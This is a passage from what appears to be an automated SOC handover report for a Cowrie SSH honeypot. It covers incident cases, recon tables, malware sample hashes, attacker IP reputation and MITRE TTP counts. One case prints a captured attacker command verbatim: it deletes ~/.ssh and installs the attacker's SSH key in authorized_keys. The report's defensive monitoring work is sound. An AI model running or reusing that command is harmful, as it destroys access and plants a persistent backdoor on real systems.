| `2026-04-05 17:59:14` | `cowrie.command.failed` |
| `2026-04-05 17:59:14` | `cowrie.log.closed` |
| `2026-04-05 17:59:15` | `cowrie.session.params` |
| `2026-04-05 17:59:15` | `cowrie.command.input` |
| `2026-04-05 17:59:15` | `cowrie.session.file_download` |
| `2026-04-05 17:59:15` | `cowrie.log.closed` |
| `2026-04-05 17:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d5e94a9e377

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:59 |
| **Last Seen** | 2026-04-05 17:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:59:19` | `cowrie.session.connect` |
| `2026-04-05 17:59:19` | `cowrie.client.version` |
| `2026-04-05 17:59:19` | `cowrie.client.kex` |
| `2026-04-05 17:59:20` | `cowrie.login.success` |
| `2026-04-05 17:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6100c822e88

| Field | Detail |
|---|---|
| **Source IP** | `49.49.231[.]154` |
| **First Seen** | 2026-04-05 18:11 |
| **Last Seen** | 2026-04-05 18:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 18:11:48` | `cowrie.session.connect` |
| `2026-04-05 18:11:48` | `cowrie.client.version` |
| `2026-04-05 18:11:48` | `cowrie.client.kex` |
| `2026-04-05 18:11:49` | `cowrie.login.success` |
| `2026-04-05 18:11:49` | `cowrie.session.params` |
| `2026-04-05 18:11:49` | `cowrie.command.input` |
| `2026-04-05 18:11:49` | `cowrie.command.failed` |
| `2026-04-05 18:11:49` | `cowrie.log.closed` |
| `2026-04-05 18:11:49` | `cowrie.session.params` |
| `2026-04-05 18:11:49` | `cowrie.command.input` |
| `2026-04-05 18:11:49` | `cowrie.session.file_download` |
| `2026-04-05 18:11:49` | `cowrie.log.closed` |
| `2026-04-05 18:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.49.231[.]154` to AbuseIPDB if not already reported
- [ ] Block `49.49.231[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68b0bdfaf309

| Field | Detail |
|---|---|
| **Source IP** | `49.49.231[.]154` |
| **First Seen** | 2026-04-05 18:11 |
| **Last Seen** | 2026-04-05 18:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 18:11:51` | `cowrie.session.connect` |
| `2026-04-05 18:11:51` | `cowrie.client.version` |
| `2026-04-05 18:11:51` | `cowrie.client.kex` |
| `2026-04-05 18:11:52` | `cowrie.login.success` |
| `2026-04-05 18:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.49.231[.]154` to AbuseIPDB if not already reported
- [ ] Block `49.49.231[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `102.88.137[.]80` | **25** | 2026-04-05 17:31 | 2026-04-05 17:59 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `112.184.119[.]22` | **25** | 2026-04-05 16:51 | 2026-04-05 17:18 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.104[.]44` | **25** | 2026-04-05 17:16 | 2026-04-05 17:35 | 29m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `49.49.231[.]154` | **7** | 2026-04-05 17:06 | 2026-04-05 18:14 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `181.49.8[.]57` | **2** | 2026-04-05 17:23 | 2026-04-05 17:37 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `1.30.199[.]218` | 1 | 2026-04-05 16:50 | 2026-04-05 16:50 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.213.238[.]91` | 1 | 2026-04-05 16:56 | 2026-04-05 16:56 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.21.140[.]191` | 1 | 2026-04-05 17:44 | 2026-04-05 17:44 | 12s | 0 | `T1592` | 🟢 LOW |
| `218.161.99[.]102` | 1 | 2026-04-05 17:39 | 2026-04-05 17:39 | 30s | 0 | `T1592` | 🟢 LOW |
| `45.78.204[.]246` | 1 | 2026-04-05 17:07 | 2026-04-05 17:07 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `51.79.84[.]112` | 1 | 2026-04-05 17:37 | 2026-04-05 17:37 | 8s | 0 | `T1592` | 🟢 LOW |
| `60.204.153[.]115` | 1 | 2026-04-05 17:28 | 2026-04-05 17:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.50.114[.]230` | 1 | 2026-04-05 17:56 | 2026-04-05 17:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.92.199[.]36` | 1 | 2026-04-05 17:24 | 2026-04-05 17:24 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `115.21.140[.]191` | KR | Sudogwonseobubonbu | **100** ⚠️ | 12 |
| `218.161.99[.]102` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 17 |
| `60.204.153[.]115` | CN | Huawei Public Cloud Service (Huawei Software Technologies Ltd.Co) | **100** ⚠️ | 3 |
| `61.50.114[.]230` | CN | China Unicom Beijing province network | **100** ⚠️ | 27 |
| `112.184.119[.]22` | KR | Jeonbukbonbujang | **100** ⚠️ | 50 |
| `91.92.199[.]36` | BG | Elektron Invest Ltd. | **100** ⚠️ | 50 |
| `103.213.238[.]91` | BD | Inspire Broadband | **100** ⚠️ | 50 |
| `49.49.231[.]154` | TH | Triple T Broadband Public Company Limited | **100** ⚠️ | 16 |
| `45.78.204[.]246` | SG | BYTEPLUS | **100** ⚠️ | 50 |
| `181.49.8[.]57` | CO | Telmex Colombia S.A. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 151 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 67 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 60 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 31 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 31 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 155 cases |
| Tool 34  | Credential Extractor        | ✅ 127 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 16 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (1.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 1 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 60 priority case(s) shown individually · 14 recon entry/entries in table (5 group(s) consolidating 84 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-05T18:41:27Z_
